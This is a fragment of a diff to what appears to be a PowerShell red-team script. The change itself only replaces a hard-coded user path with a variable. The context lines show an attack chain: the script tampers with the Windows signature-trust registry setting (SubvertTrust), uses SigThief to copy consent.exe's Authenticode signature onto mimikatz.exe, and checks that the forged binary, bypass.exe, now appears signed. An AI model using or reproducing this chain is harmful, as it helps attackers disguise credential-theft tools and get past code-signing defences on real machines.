@@ -77,7 +77,7 @@ function RevertTrust
         $PESignatureVerifier | Set-ItemProperty -Name FuncName -Value $NewFuncName
 }
 
-cd c:\Users\cpillar\Desktop\
+cd $desktop
 python $wpath\SigThief\sigthief.py -i C:\Windows\System32\consent.exe -t $desktop\mimikatz.exe -o $desktop\bypass.exe
 SubvertTrust
 Get-AuthenticodeSignature -FilePath C:\Users\cpillar\Desktop\bypass.exe
